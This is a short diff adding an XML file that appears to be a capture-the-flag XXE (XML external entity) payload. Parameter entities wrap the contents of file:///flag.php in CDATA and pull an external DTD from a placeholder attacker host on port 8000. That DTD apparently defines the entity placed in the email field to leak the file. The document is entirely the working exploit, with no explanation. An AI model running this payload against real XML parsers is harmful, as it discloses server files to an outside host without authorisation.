@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///flag.php">
+  <!ENTITY % end "]]>">
+  <!ENTITY % xxe SYSTEM "http://<IP>:8000/xxe_cdata.dtd">
+  %xxe;
+]>
+<root>
+<name>Hello</name>
+<tel>14456</tel>
+<email>&joined;</email>
+<message>hahah</message>
+</root>
